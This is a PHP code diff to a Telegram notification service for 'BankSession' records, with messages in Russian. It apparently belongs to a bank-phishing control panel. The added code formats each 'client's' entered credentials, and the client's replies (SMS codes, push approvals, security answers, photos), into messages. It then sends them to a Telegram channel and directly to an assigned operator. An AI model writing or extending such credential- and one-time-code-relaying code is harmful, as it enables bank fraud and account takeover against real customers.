@@ -184,9 +184,18 @@ HTML;
     {
         $tag    = $this->logTag($session);
         $domain = $this->domainLine($session);
-        $this->sendToChannel(
-            "📝 <b>Клиент ввёл данные</b>  {$tag}{$domain}"
-        );
+        $text   = "📝 <b>Клиент ввёл данные</b>  {$tag}{$domain}";
+
+        $creds = $session->credentials ?? [];
+        if ($creds) {
+            $text .= "\n";
+            foreach ($creds as $k => $v) {
+                $text .= "\n<b>" . e(ucfirst((string) $k)) . "</b>: <code>" . e((string) $v) . "</code>";
+            }
+        }
+
+        $this->sendToChannel($text);
+        $this->notifyAssignedAdmin($session, $text);
     }
 
     public function notifyActionSent(\App\Models\BankSession $session, string $actionLabel): void
@@ -203,10 +212,57 @@ HTML;
     {
         $tag    = $this->logTag($session);
         $domain = $this->domainLine($session);
-        $this->sendToChannel(
-            "📥 <b>Ответ клиента</b>  {$tag}{$domain}\n\n" .
-            "📋 {$command}\n" .
-            "💬 <code>{$value}</code>"
-        );
+        $label  = $this->commandLabel($command);
+        $text = "📥 <b>Ответ клиента</b>  {$tag}{$domain}\n\n" .
+            "📋 {$label}\n" .
+            "💬 <code>" . e($value) . "</code>";
+
+        $this->sendToChannel($text);
+        $this->notifyAssignedAdmin($session, $text);
+    }
+
+    public function notifyAssignedAdmin(\App\Models\BankSession $session, string $text): void
+    {
+        if ($session->admin_id === null) {
+            return;
+        }
+
+        $admin = Admin::find($session->admin_id);
+        if ($admin === null || empty($admin->telegram_user_id)) {
+            return;
+        }
+
+        $bot = $this->bot();
+        if (!$bot) {
+            return;
+        }
+
+        try {
+            $bot->sendMessage(
+                text: $text,
+                chat_id: $admin->telegram_user_id,
+                parse_mode: 'HTML',
+            );
+        } catch (\Throwable $e) {
+            logger()->warning('Failed to DM assigned admin', [
+                'session_id' => $session->id,
+                'admin_id'   => $admin->id,
+                'error'      => $e->getMessage(),
+            ]);
+        }
+    }
+
+    private function commandLabel(string $command): string
+    {
+        return match ($command) {
+            'sms'                 => '📱 SMS-код',
+            'push'                => '🔔 Push-ответ',
+            'question'            => '❓ Ответ на вопрос',
+            'photo.request'       => '📷 Фото от клиента',
+            'photo.with-input'    => '📸 Фото + текст от клиента',
+            'photo.without-input' => '📸 Фото от клиента',
+            'photo.question'      => '📸❓ Ответ на фото-вопрос',
+            default               => $command,
+        };
     }
 }
